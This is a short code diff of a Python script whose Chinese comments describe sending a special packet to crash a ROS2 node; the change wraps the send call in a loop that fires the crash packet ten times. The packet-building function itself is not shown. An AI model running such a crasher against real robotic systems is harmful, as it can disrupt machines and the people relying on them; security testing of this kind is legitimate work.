@@ -36,9 +36,11 @@ args = parser.parse_args()
 
 try:
     # 發送特殊封包，讓 ROS2 節點崩潰。
-    send(get_crasher(args.target))
-    print("\n[*] pkg have been send")
-
+    for i in range(10):
+        send(get_crasher(args.target))
+        sleep(0.1)
+        print("\n[*] pkg have been send")
+    print("\n[*] over")
 except KeyboardInterrupt:
     print("\n[!] 測試已被使用者中斷。")
 except Exception as e:
